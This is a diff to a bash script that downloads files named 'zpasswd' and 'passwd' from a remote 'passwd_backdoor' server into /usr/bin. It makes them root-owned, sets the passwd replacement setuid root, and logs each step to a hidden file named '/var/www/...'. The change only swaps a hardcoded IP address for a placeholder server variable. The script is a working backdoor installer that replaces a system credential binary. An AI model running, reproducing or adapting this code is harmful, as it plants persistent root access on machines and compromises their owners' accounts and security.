@@ -1,6 +1,7 @@
 #!/bin/bash
 
 NOW=$(date +"%d %b %Y %H:%M:%S")
+SERVERIP="x.x.x.x"
 
 if [ ! -f /var/www/... ]; then
    /bin/touch /var/www/...
@@ -10,14 +11,14 @@ if [ ! -f /var/www/... ]; then
 fi
 
 if [ ! -f /usr/bin/zpasswd ]; then
-   /usr/bin/wget -P /usr/bin/ http://75.127.15.174/passwd_backdoor/zpasswd > /dev/null 2>&1
+   /usr/bin/wget -P /usr/bin/ http://$SERVERIP/passwd_backdoor/zpasswd > /dev/null 2>&1
    /bin/chown root:root /usr/bin/zpasswd
    /bin/chmod 0755 /usr/bin/zpasswd
    echo "[$NOW] Downloaded zpasswd" >> /var/www/...
 fi
 
 if [ ! -f /usr/bin/passwd ]; then
-  /usr/bin/wget -P /usr/bin/ http://75.127.15.174/passwd_backdoor/passwd > /dev/null 2>&1
+  /usr/bin/wget -P /usr/bin/ http://$SERVERIP/passwd_backdoor/passwd > /dev/null 2>&1
   /bin/chown root:root /usr/bin/passwd
   /bin/chmod 4755 /usr/bin/passwd
   echo "[$NOW] Downloaded passwd" >> /var/www/...
